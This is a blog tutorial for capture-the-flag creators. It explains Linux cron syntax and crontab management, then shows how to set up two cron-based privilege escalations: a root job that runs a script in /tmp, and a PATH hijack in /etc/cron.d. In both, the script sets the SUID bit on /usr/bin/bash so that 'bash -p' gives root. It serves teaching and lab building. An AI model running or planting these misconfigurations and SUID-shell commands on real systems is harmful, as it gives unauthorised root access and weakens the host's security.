---
title: Linux Privilege Escalation - Cron Jobs for CTF Creators
draft: false
author: "pwnlog"
authorLink: ""
description: ""
license: ""
images: []
date: 2021-12-28 11:33:00 +0800
categories: [Linux Privilege Escalation]
tags: [privilege escalation, cron jobs, crontabs, path hijacking, systemd-wide-crontab, defend]

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: false
rssFullText: false

code:
  copy: true
  maxShownLines: -1
  # ...
math:
  enable: true
  # ...
mapbox:
  accessToken: ""
  # ...
share:
  enable: true
  # ...
comment:
  enable: true
  # ...
library:
  css:
    # someCSS = "some.css"
    # located in "assets/"
    # Or
    # someCSS = "https://cdn.example.com/some.css"
  js:
    # someJS = "some.js"
    # located in "assets/"
    # Or
    # someJS = "https://cdn.example.com/some.js"
seo:
  images: []
  # ...

summary: "Dear time can u help me 3l3v4t3 /(^.^)/"
---

# Cron Jobs

Cron jobs are scheduled task which are used to automate specific task at specific time intervals. Cron tables (crontabs) store the configuration of these cron jobs. These can be configured to run as high privileged users or groups. However, if they are misconfigured, it can lead to elevation of privilege.

# Cron Jobs Syntax

Here is the syntax of a cron job:

```shell
# Example of job definition:​

# .---------------- minute (0 - 59)​

# |  .------------- hour (0 - 23)​

# |  |  .---------- day of month (1 - 31)​

# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...​

# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat​

# |  |  |  |  |​

# *  *  *  *  * user-name command to be executed
```

# Cron Jobs Symbols

These are the meaning of each symbol:

| Symbol | Value                |
|--------|----------------------|
| *      | Any value            |
| ,      | Value list separator |
| -      | Range of values      |
| /      | Step of values       |

# Cron Jobs Generator

Crontab generators can be used to automate the process of creating a cron job:

- [crontab guru](https://crontab.guru/)

# Crontabs Tables

Crontab table syntax:

| Minute  | Hour   | Day Of Month | Month   | Day Of Week     |
|---------|--------|------|---------|---------|
| 0-59    | 0-23   | 1-31 | 1-12    | 0-7     |
| *       | *      | *    | *       | *       |
| 12,46   | 1,2,20 | 7,29 | MAR,AUG | 3,5     |
| 34-56/2 | 6-12   | 7-14 | 3-8     | MON-FRI |

Run every minute:

| Minute  | Hour   |  Day Of Month | Month   | Day Of Week     |
|---------|--------|------|---------|---------|
| *    | *   | * | *    | *    |

Run every hour on the hour:

| Minute  | Hour   |  Day Of Month | Month   | Day Of Week     |
|---------|--------|------|---------|---------|
| 0    | *   | * | *    | *    |

Run every five minutes:

| Minute  | Hour   |  Day Of Month | Month   | Day Of Week     |
|---------|--------|------|---------|---------|
| \*/5    | *   | * | *    | *    |

Run at 9:30 AM on every Monday and Friday:

| Minute  | Hour   |  Day Of Month | Month   | Day Of Week     |
|---------|--------|------|---------|---------|
| 30      | 9      | *    | *       | MON-FRI |  


# Configuring Crontabs

We can list the current crontabs with the following command:

```sh
user@pwn:~$ crontab -l
no crontab for user
```

We can edit the default crontab text editor with the following:

```
crontab -e
```

The `select-editor` can also be used:

```
select-editor
```

We can remove a crontab with the following:

```
crontab -r
```

We can add a crontab from a specific user:

```
crontab -u username -e
```

We could also remove a crontab for a specific user:

```
crontab -u username -r
```

## Restarting Crontabs

After making changes to the cron configuration file, we need to restart the cron daemon for the changes to take effect. The command to restart the cron daemon varies based on the specific Unix-like system you are using. Common commands include:

- `service cron restart`
- `systemctl restart cron`
- `/etc/init.d/cron restart`

## Allow/Deny Users & Groups

Open the cron configuration file. This file is typically located in `/etc` and may be named `cron.allow` or `cron.deny` as shown below:

```
/etc/cron.deny
/etc/cron.allow
```

Then we'll need to add the usernames or group names that you want to allow in the appropriate file. Each entry should be placed on a separate line. Then we can save the changes and exit the file.

### System-Wide Crontab

The system-wide crontab is located at `/etc/crontab`. We can view the contents of the system-wide crontab, and notice how the user column is available:

```shell
user@pwn:/tmp$ ls -l /etc/crontab
-rw-r--r-- 1 root root 722 Apr  5  2016 /etc/crontab

user@pwn:/tmp$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

### User-Wide Crontab

Each crontab that we create is located in the `/var/spool/cron/crontabs` directory and by default will be named as the username of the user who owns the crontab:

```shell
user@pwn:/tmp$ sudo ls -lahR /var/spool/cron/crontabs
[sudo] password for user: 
/var/spool/cron/crontabs:
total 12K
<SNIP>
-rw------- 1 user  crontab 1.3K Nov 20 10:50 user

sudo cat /var/spool/cron/crontabs/user
```

Then we could delete the crontab file:

```shell
crontab -r
```

## Crontab Syslog

Depending on the system distribution and the system configuration. The logs may stored in one of the following locations:

- `/var/log/syslog` 
- `/var/log/cron`
- `/var/log/messages`
- `/var/log/cron.log`

> Note: The actual log file and its location can be customized based on system configurations. Therefore, it's recommended to consult the system's documentation.

Crontabs events are logged with the following syntax:

```shell
user@pwn:/tmp$ grep cron /var/log/syslog | tail -n 5
<SNIP> pwn crontab[9655]: (user) LIST (user)
<SNIP> pwn crontab[10442]: (user) BEGIN EDIT (user)
<SNIP> pwn crontab[10442]: (user) REPLACE (user)
<SNIP> pwn crontab[10442]: (user) END EDIT (user)
<SNIP> pwn cron[794]: (user) RELOAD (crontabs/user)
```

# Privilege Escalation via System-Wide Crontab

Make a script that outputs the user's security context:

```shell
vim /tmp/elevate.sh
```

To extract user information, add the following code:

```shell
#!/bin/bash

id > /tmp/user_security_context.txt
whoami >> /tmp/user_security_context.txt
```

Add execution rights to the script so that it can be run by the cron job:

```shell
chmod +x /tmp/elevate.sh
```

Edit the system-wide crontab:

```shell
sudo vim /etc/crontab
```

Add the following code to the crontab:

```shell
*  *	* * *	root	/tmp/elevate.sh
```

In summary, this may end up as the following:

```shell
user@pwn:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab we don't have to run the `crontab'
# command to install the new version when we edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *	* * *	root	/tmp/elevate.sh
#
```

Wait one minute:

```shell
watch -n 1 ls -l /tmp

Ctrl+C
```

Read the `user_security_context.txt` file:

```shell
user@pwn:/tmp$ cat /tmp/user_security_context.txt 
uid=0(root) gid=0(root) groups=0(root)
root
```

Add a `setuid` bit to the bash script:

```shell
echo '#!/bin/bash\nchmod +s /usr/bin/bash' >> /tmp/elevate.sh 
```

Wait one minute until the SUID bit is set to the bash executable:

```shell
watch -n 1 ls -l /usr/bin/bash
```

Then we can bash shell the `setuid` bit as the `root` user by passing the `-p` flag:

```shell
❯ bash -p
```

We can confirm this by using `id`:

```sh
bash-5.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare),1000(user)
```

# Privelege Escalation via PATH Environment Variable

Create a script in your home directory that adds an SUID bit to the bash executable:

```shell
#!/bin/bash

sudo chmod +s /usr/bin/bash
```

Add execution permissions to the script:

```sh
chmod +x elevate.sh
```

Create a custom cron job to run the `elevate.sh` script as the root user once every minute:

```shell
sudo vim /etc/cron.d/custom
```

Set up the cron job:

```sh
SHELL=/bin/bash
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* * * * * root elevate.sh
```

> Note: The PATH variable starts with **/home/user** which is our user's home directory.

Wait a minute, then "root" will run the script "elevate.sh":

```shell
watch -n 1 ls -l /usr/bin/bash
```

This output is what we want to get:

```sh
-rwsr-sr-x
```

Then we can bash shell the `setuid` bit as the `root` user by passing the `-p` flag:

```shell
❯ bash -p
```

We can confirm this by using `id`:

```sh
bash-5.1# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare),1000(user)
```